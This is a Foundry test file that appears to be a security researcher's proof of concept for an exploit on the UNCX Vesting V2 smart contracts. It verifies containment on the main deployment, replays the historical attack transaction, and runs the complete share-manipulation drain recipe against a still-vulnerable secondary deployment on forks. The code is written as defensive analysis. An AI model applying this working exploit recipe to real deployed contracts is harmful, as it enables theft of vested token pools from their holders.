// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {IVestingManager} from "../src/IVestingManager.sol";
import {MockERC20} from "../src/MockERC20.sol";

/// @title UNCX Vesting V2 — residual extractability PoC (fork tests only; no mainnet txs)
/// @notice Z3-C1 deep-dive. Verifies on Ethereum mainnet forks:
///   (A) main deployment 0xa98f06…: containment live, fresh creation blocked, all incident
///       attacker schedules fully drained, no live manipulable schedule;
///   (B) historical replay of the real exploit tx at block 26,191,744 (proof the recipe is exact);
///   (C) secondary 14.4KB build 0xBcD6aee8…: the identical bug is LIVE in deployed bytecode —
///       full recipe end-to-end on a fork (with a simulated victim pool) — but economically dead
///       because the pool holds $4.73 and one schedule costs 100 ETH.
contract UncxVestingTest is Test {
    // ---- main deployment (18,010-byte VestingManager) ----
    IVestingManager constant VM = IVestingManager(0xA98F06312b7614523d0f5e725e15fd20fB1b99F5);
    // ---- secondary deployment (14,392-byte older build) ----
    IVestingManager constant VM2 = IVestingManager(0xBcD6aee8D104Dd6F1985686bF294cE9Ed2269CAF);

    address constant EDGEN   = 0xAa9806c938836627Ed1a41Ae871c7E1889AE02Ca;
    address constant ZC      = 0x4E67DB19044549fF420860834c91b45BaD298722;
    address constant PEPE    = 0xA9E8aCf069C58aEc8825542845Fd754e41a9489A;
    address constant LO0P    = 0x00000000000050806673B532D7486ac114c1De3F;
    address constant PAAL    = 0x14feE680690900BA0ccCfC76AD70Fd1b95D10e16;
    address constant AXGT    = 0x6112C3509A8a787df576028450FebB3786A2274d;
    address constant USDC    = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    address constant ATTACKER = 0x78C9B11853E4f183a34C63fFd1924d2319a2f5B3;
    address constant HELPER   = 0xf6D072254Eb8A9B06e0bA21221b498332C1BC35E;
    address constant HELPER_CONTRACT = 0x6cEbDf095172B355121b93962017975C4601F26c;

    uint256 constant ATTACK_BLOCK = 26191744; // pre-state of the exploit tx (26,191,745)

    // recorded post-attack state (validated against chain reads at block 26,191,745)
    uint256 constant POST_EDGEN_BAL = 32_941_964_644;
    uint256 constant POST_EDGEN_SHARES = 17_572_899;
    uint256 constant POST_ZC_BAL = 1_893_433_584_362_617_081_504_588;

    // storage layout (verified on-chain): _totalTokenShares mapping at slot 11
    uint256 constant SLOT_TOTAL_SHARES = 11;

    // ---------------------------------------------------------------- helpers

    function _rpc() internal view returns (string memory) {
        // prefer archive-capable endpoints injected by CI; never print URLs
        string memory u = vm.envOr("NODEREAL_ETH_RPC_URL", string(""));
        if (bytes(u).length > 0) return u;
        u = vm.envOr("BLOCKPI_RPC_URL", string(""));
        if (bytes(u).length > 0) return u;
        u = vm.envOr("FORK_RPC_URL", string(""));
        if (bytes(u).length > 0) return u;
        return "https://ethereum-rpc.publicnode.com";
    }

    function _totalShares(address token) internal view returns (uint256) {
        return uint256(vm.load(address(VM), keccak256(abi.encode(token, SLOT_TOTAL_SHARES))));
    }

    function _totalSharesAt(address vmAddr, address token) internal view returns (uint256) {
        return uint256(vm.load(vmAddr, keccak256(abi.encode(token, SLOT_TOTAL_SHARES))));
    }

    function _bal(address token, address who) internal view returns (uint256) {
        (bool ok, bytes memory d) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", who));
        return ok ? abi.decode(d, (uint256)) : 0;
    }

    function _tranche(uint256 t, uint256 a) internal pure returns (IVestingManager.TimeAmount[] memory tr) {
        tr = new IVestingManager.TimeAmount[](2);
        tr[0] = IVestingManager.TimeAmount(t - 1000, 0, 0);
        tr[1] = IVestingManager.TimeAmount(t - 500, a, 0);
    }

    function _claimableShares(uint256 id) internal view returns (uint256 shares, bool reverted) {
        try VM._getReleasableShares(id) returns (uint256 s) { shares = s; }
        catch { reverted = true; }
    }

    // ---------------------------------------------------------------- (A) live state

    function test_A1_liveContainmentParams() public {
        vm.createSelectFork(_rpc());
        assertEq(VM.flatFee(), type(uint256).max, "flatFee should be uint256.max");
        assertEq(VM.feePercentage(), 500, "feePercentage should be 5%");
        assertGt(VM.nextVestingId(), 5099, "nextVestingId >= 5100");
        console2.log("ETH main flatFee(uint256.max):", VM.flatFee());
        console2.log("ETH main feePercentage:", VM.feePercentage());
        console2.log("ETH main nextVestingId:", VM.nextVestingId());
        console2.log("ETH main owner:", VM.owner());
    }

    function test_A2_freshAttackerCreationBlocked() public {
        vm.createSelectFork(_rpc());
        address atk = makeAddr("freshAttacker");
        vm.deal(atk, 1_000_000 ether); // even a 1M-ETH attacker cannot pay uint256.max wei
        MockERC20 tok = new MockERC20();
        tok.mint(atk, 1_000_000e18);
        vm.prank(atk);
        tok.approve(address(VM), type(uint256).max);
        IVestingManager.TimeAmount[] memory tr = _tranche(block.timestamp, 1_000e18);
        vm.prank(atk);
        vm.expectRevert(abi.encodeWithSignature("InvalidFlatFee()"));
        VM.createVesting{value: 1_000_000 ether}(tok_addr(tok), tr, atk, true, false, false, true);

        // daily-soft entry point must also fail
        vm.prank(atk);
        vm.expectRevert(abi.encodeWithSignature("InvalidFlatFee()"));
        VM.createDailySoftVesting{value: 1_000_000 ether}(tok_addr(tok), tr, atk);

        // airdrop entry point must also fail
        address[] memory bens = new address[](2);
        bens[0] = atk; bens[1] = atk;
        vm.prank(atk);
        vm.expectRevert(abi.encodeWithSignature("InvalidFlatFee()"));
        VM.createAirdropVesting{value: 1_000_000 ether}(tok_addr(tok), tr, bens, true, false, false, true);
    }

    function test_A3_allIncidentSchedulesDrained() public {
        vm.createSelectFork(_rpc());
        uint256 totalSharesEDGEN = _totalShares(EDGEN);
        console2.log("current EDGEN totalShares:", totalSharesEDGEN);
        console2.log("current EDGEN pool balance:", _bal(EDGEN, address(VM)));
        uint256 liveManipulable = 0;
        for (uint256 id = 5058; id <= 5099; id++) {
            (uint256 shares, bool reverted) = _claimableShares(id);
            IVestingManager.VestingSchedule memory s = VM.getVestingSchedule(id);
            if (s.isSoft && s.isTopable && !s.cancelled) liveManipulable++;
            if (!reverted && shares > 0) {
                uint256 ts = _totalShares(s.token);
                uint256 amt = ts == 0 ? 0 : shares * _bal(s.token, address(VM)) / ts;
                console2.log("schedule with claimable shares:", id);
                console2.log("  shares:", shares);
                console2.log("  amount:", amt);
                assertEq(amt, 0, "incident schedule has claimable amount");
            }
        }
        assertEq(liveManipulable, 0, "no live soft+topable incident schedule may exist");
        console2.log("live manipulable incident schedules:", liveManipulable);
    }

    function test_A4_cancelledSchedulesCannotBeReManipulated() public {
        vm.createSelectFork(_rpc());
        // the attacker's soft+topable schedules are all cancelled -> topUp/cancel must revert
        uint256[6] memory softs = [uint256(5059), 5060, 5062, 5064, 5066, 5068];
        for (uint256 i = 0; i < softs.length; i++) {
            IVestingManager.TimeAmount[] memory tr = _tranche(block.timestamp + 10_000, 1_000e18);
            vm.prank(HELPER);
            vm.expectRevert(abi.encodeWithSignature("VestingAlreadyCancelled()"));
            VM.topUpVesting(softs[i], tr);
            vm.prank(HELPER);
            vm.expectRevert(abi.encodeWithSignature("VestingAlreadyCancelled()"));
            VM.cancel(softs[i]);
        }
    }

    function test_A5_noFeeExemptionsRemain() public {
        vm.createSelectFork(_rpc());
        // storage slots: feeExemptCreators = 19, feeExemptTokens = 20
        address[3] memory creators = [
            0x02e7CfF21781776b6f2fD7049e892d4b121b14fe,
            0x037287a8844835e663c392d7f86eb2dBF2a14A98,
            0xA4068Dcb282a1A957740c3E0E10AE7b588216dD8
        ];
        for (uint256 i = 0; i < creators.length; i++) {
            uint256 v = uint256(vm.load(address(VM), keccak256(abi.encode(creators[i], uint256(19)))));
            assertEq(v, 0, "creator must not be fee-exempt");
        }
        uint256 t = uint256(vm.load(address(VM), keccak256(abi.encode(0x78069E97C5a1c4a92da4C577DBCfd86CFd83da53, uint256(20)))));
        assertEq(t, 0, "token must not be fee-exempt");
    }

    function test_A6_residualPoolsForHolders() public {
        vm.createSelectFork(_rpc());
        console2.log("AXGT  pool:", _bal(AXGT, address(VM)));
        console2.log("ZC    pool:", _bal(ZC, address(VM)));
        console2.log("PEPE  pool:", _bal(PEPE, address(VM)));
        console2.log("EDGEN pool:", _bal(EDGEN, address(VM)));
        assertGt(_bal(AXGT, address(VM)), 0, "AXGT residual exists (holder-claimable)");
    }

    // ---------------------------------------------------------------- (B) historical replay

    function test_B1_replayRealExploitTx() public {
        string memory url = _rpc();
        uint256 fork;
        try vm.createSelectFork(url, ATTACK_BLOCK) returns (uint256 f) { fork = f; }
        catch { console2.log("archive fork unavailable - replay skipped"); return; }
        fork; // silence warning

        // pre-state must match the chain (EDGEN pool untouched)
        assertEq(_bal(EDGEN, address(VM)), 57_344_850_920_662_031_757_537_814, "pre EDGEN balance");
        assertEq(_totalShares(EDGEN), 57_344_850_920_662_031_757_537_814, "pre EDGEN shares");

        // replay the real attack calldata from the real attacker EOA
        bytes memory input = vm.parseBytes(vm.readFile("test/data/attack_input.txt"));
        vm.deal(address(this), 10 ether);
        vm.prank(ATTACKER, ATTACKER); // msg.sender + tx.origin
        (bool ok,) = HELPER_CONTRACT.call{value: 0.8 ether}(input);
        assertTrue(ok, "attack replay failed");

        // post-state must match the recorded on-chain post-attack state exactly
        assertEq(_bal(EDGEN, address(VM)), POST_EDGEN_BAL, "post EDGEN balance");
        assertEq(_totalShares(EDGEN), POST_EDGEN_SHARES, "post EDGEN shares");
        assertEq(_bal(ZC, address(VM)), POST_ZC_BAL, "post ZC balance");
        assertEq(VM.nextVestingId(), 5069, "post nextVestingId");
        console2.log("replay OK - EDGEN drained to", _bal(EDGEN, address(VM)));
        console2.log("replay OK - attacker schedules created:", VM.nextVestingId() - 5058);
    }

    // ---------------------------------------------------------------- (C) secondary deployment

    /// @notice Full exploit recipe end-to-end against the LIVE secondary 14.4KB deployment,
    ///         with a simulated victim pool (real pool is only $4.73). Proves the bug is
    ///         present in deployed bytecode; economics evaluated in test_C3.
    ///         Amounts = the real EDGEN attack amounts x0.999 (knife-edge sensitivity proven
    ///         by the validated integer model in analysis/sim_exploit.py).
    ///         Variant 1: 3 schedules via createVesting (receiver + 2 soft manipulators).
    function test_C1_secondaryFullRecipe() public {
        vm.createSelectFork(_rpc());
        assertEq(VM2.flatFee(), 100 ether, "secondary flatFee");
        assertEq(VM2.feePercentage(), 10, "secondary fee 0.1%");
        console2.log("secondary nextVestingId:", VM2.nextVestingId());
        console2.log("secondary REAL USDC pool:", _bal(USDC, address(VM2)));
        (uint256 profit, uint256 poolLeft, uint256 victimClaim) = _runSecondaryRecipe(false);
        console2.log("attacker PROFIT (MOCK):", profit);
        console2.log("pool left             :", poolLeft);
        console2.log("victim claimable      :", victimClaim);
        assertGt(profit, 50_000_000e18, "attacker must net ~the victim pool");
        assertLt(poolLeft, 1e15, "victim pool must be drained to dust");
    }

    /// @notice Variant 2: all schedules created in ONE createAirdropVesting call.
    ///         The flat fee is charged once per call -> minimum attack cost = 1 flat fee.
    function test_C2_airdropSingleFlatFee() public {
        vm.createSelectFork(_rpc());
        (uint256 profit, uint256 poolLeft,) = _runSecondaryRecipe(true);
        console2.log("airdrop-variant PROFIT:", profit);
        console2.log("airdrop-variant pool left:", poolLeft);
        assertGt(profit, 1_000_000e18, "airdrop variant must also drain part of the pool");
    }

    function _runSecondaryRecipe(bool useAirdrop) internal returns (uint256 profit, uint256 poolLeft, uint256 victimClaim) {
        uint256 t = block.timestamp;
        address victim = makeAddr("victim");
        address atk = makeAddr("attacker");
        MockERC20 tok = new MockERC20();

        // real EDGEN attack amounts x0.999 (validated integer model)
        uint256 VIC  = 57_344_850_920_662_031_757_537_814;
        uint256 A1   = 57_287_506_069_741_369_725_779;
        uint256 A2   = 131_188_388_899_707_736_672_036_832;
        uint256 DON  = 49_676_029_939_783_477_317_642_788;
        uint256 F    = 212_405_459_129_840_773_945_972_787;

        tok.mint(victim, VIC);
        tok.mint(atk, 1_000_000_000e18);
        vm.deal(victim, 200 ether);
        vm.deal(atk, 400 ether);

        vm.prank(victim);
        tok.approve(address(VM2), type(uint256).max);
        vm.prank(atk);
        tok.approve(address(VM2), type(uint256).max);

        // victim creates a plain (non-soft) schedule — pays the 100 ETH flat fee
        vm.prank(victim);
        uint256 vid = VM2.createVesting{value: 100 ether}(tok_addr(tok), _tranche(t, VIC), victim, false, false, false, false);

        vm.startPrank(atk);
        uint256 atkStart = tok.balanceOf(atk);
        uint256 recvId;
        uint256 softId;
        uint256 softId2;
        if (useAirdrop) {
            address[] memory bens = new address[](3);
            bens[0] = atk; bens[1] = atk; bens[2] = atk;
            uint256[] memory ids = VM2.createAirdropVesting{value: 100 ether}(
                tok_addr(tok), _tranche(t, A2), bens, true, false, false, true);
            recvId = ids[0]; softId = ids[1]; softId2 = ids[2];
        } else {
            recvId = VM2.createVesting{value: 100 ether}(tok_addr(tok), _tranche(t, A1), atk, false, false, false, false);
            softId = VM2.createVesting{value: 100 ether}(tok_addr(tok), _tranche(t, A2), atk, true, false, false, true);
            softId2 = VM2.createVesting{value: 100 ether}(tok_addr(tok), _tranche(t, A2), atk, true, false, false, true);
        }

        VM2.release(softId);
        VM2.release(softId2);
        tok.transfer(address(VM2), DON); // donation skews share price

        IVestingManager.TimeAmount[] memory add = new IVestingManager.TimeAmount[](2);
        add[0] = IVestingManager.TimeAmount(t + 10_000, A2, 0);
        add[1] = IVestingManager.TimeAmount(t + 20_000, F, 0);
        VM2.topUpVesting(softId, add);
        VM2.cancel(softId); // over-reduces global shares (1st)
        VM2.topUpVesting(softId2, add);
        VM2.cancel(softId2); // over-reduces global shares (2nd) -> pool concentrated
        VM2.release(recvId); // receiver over-claims the concentrated pool
        profit = tok.balanceOf(atk) - atkStart;
        vm.stopPrank();
        poolLeft = tok.balanceOf(address(VM2));
        victimClaim = VM2.getReleasableAmount(vid);
    }

    function tok_addr(MockERC20 t) internal pure returns (address) { return address(t); }

    function _sharesOf(address vmAddr, address token) internal view returns (uint256) {
        return uint256(vm.load(vmAddr, keccak256(abi.encode(token, SLOT_TOTAL_SHARES))));
    }

    /// @notice Economics on the LIVE pool: extraction is ~$4.73 while one flat fee is 100 ETH.
    function test_C2_secondaryEconomicsDead() public {
        vm.createSelectFork(_rpc());
        uint256 realPool = _bal(USDC, address(VM2));
        console2.log("real secondary USDC pool (6dp):", realPool);
        // two schedules needed -> 200 ETH flat fees; pool must exceed that to be worth it
        assertLt(realPool, 2 * VM2.flatFee(), "pool smaller than 2 flat fees -> not viable");
        console2.log("flatFee per schedule (wei):", VM2.flatFee());
        console2.log("required pool > 2*flatFee wei-equivalent:", 2 * VM2.flatFee());
    }

    /// @notice BSC secondary holds dust too (0.5 CAKE + 0.22 USDT) — cross-checked off-chain;
    ///         this test only asserts the ETH-side conclusion stands on its own.
    function test_C3_secondaryAddressIsLiveCode() public {
        vm.createSelectFork(_rpc());
        assertGt(address(VM2).code.length, 14_000, "secondary has live bytecode");
        console2.log("secondary code size:", address(VM2).code.length);
        console2.log("secondary owner:", VM2.owner());
    }
}
